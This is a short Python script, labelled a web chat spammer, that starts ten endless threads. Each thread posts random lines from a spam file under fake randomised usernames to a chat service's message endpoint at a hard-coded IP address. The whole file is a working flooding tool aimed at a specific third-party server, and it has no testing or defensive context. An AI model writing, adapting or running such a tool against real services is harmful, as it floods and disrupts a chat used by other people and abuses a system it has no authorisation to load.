#web chat spammer by SibHckr
import requests
from threading import Thread
import random

url = "http://64.227.159.225:5601/sendMsg/"
spam_file = "spams/spam_def.txt"

def biboran():
    while True:
        try:
            with open(spam_file, 'r', encoding="utf-8") as file:
                lines = file.readlines()
                message = random.choice(lines)
                data = {
                    "Name" : "BiboranV4_" + str(random.randint(0, 1000)),
                    "groupName" : "",
                    "Message" : message,
                    "UserStatus" : "Connected"
                }
                req = requests.post(url, data=data)
                print("Sended ")
        except Exception as e:
            print(e)
            pass

for thr in range(10):
    Thread(target=biboran).start()